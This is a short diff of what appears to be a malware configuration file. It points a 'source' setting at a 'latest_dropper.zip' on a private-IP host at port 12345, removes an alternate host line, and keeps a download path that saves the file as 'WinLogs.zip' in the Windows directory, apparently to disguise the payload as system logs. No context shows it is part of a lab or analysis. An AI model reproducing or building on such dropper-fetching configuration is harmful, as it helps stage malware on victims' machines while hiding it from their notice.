@@ -1,3 +1,2 @@
-source=http://android-2.local:12345//versions/latest_dropper.zip
-sourcebak=http://192.168.100.50:12345/versions/latest_dropper.zip
+source=http://192.168.100.50:12345/versions/latest_dropper.zip
 downloadzip=C:\\Windows\\WinLogs.zip
